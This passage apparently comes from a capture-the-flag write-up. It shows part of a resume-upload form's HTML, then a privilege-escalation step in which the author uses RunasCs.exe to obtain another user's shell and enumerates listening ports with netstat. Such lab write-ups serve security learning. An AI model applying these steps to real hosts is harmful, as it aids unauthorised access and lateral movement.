</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Work Experience<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;experience&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">20</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">30</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>      
</span></span><span style="display:flex;"><span>	  <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Requested Salary<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;salary&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;30 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">30</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;60 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">60</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;80 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">80</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;100 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">100</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;200 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">200</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;300 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">300</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Choose Your Department<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span>style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;department&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;IT&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>IT<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Sales&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Sales<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Management&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Management<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;&lt;</span>div style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;display:flex; flex-direction:column;  align-items: center;justify-content: center;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3 style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;padding-left:50px&#34;</span> <span style="color:#ff79c6">&gt;</span>Upload Resume:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstylef&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;assignment&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>button type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span><span style="color:#ff79c6">&gt;</span>Upload Resume<span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>form<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span> 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Using <code>RunasCs.exe</code> I was able to get <code>tstark</code>&rsquo;s shell and found the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\Users\tstark\Desktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/18/2024  11:33 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM             7,168 a.exe
</span></span><span style="display:flex;"><span>04/28/2024  09:59 PM                34 user.txt
</span></span><span style="display:flex;"><span>               2 File(s)          7,202 bytes
</span></span><span style="display:flex;"><span>               2 Dir(s)   4,989,374,464 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;
</span></span></code></pre></div><p>After a lot of enumeration I found some open ports on the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">80</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">88</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">135</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">389</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">443</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">445</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">464</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">593</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">636</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3268</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3269</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3306</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">5985</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">8083</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">9389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">47001</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49664</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49665</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49666</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49667</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49668</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49670</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55479</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55485</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55495</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60177</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60180</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">53</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">139</span>         <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">53</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">80</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">88</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">135</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">443</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">445</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">464</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">593</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3306</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">5985</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">8083</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">9389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">47001</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49664</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49665</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49666</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49667</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49668</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49670</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55479</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55485</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55495</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60177</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60180</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    [::<span style="color:#bd93f9">1</span>]:<span style="color:#bd93f9">53</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span></code></pre></div><p>Port <code>8083</code> seemed to run a a <code>internal http service</code> I previously found.</p>
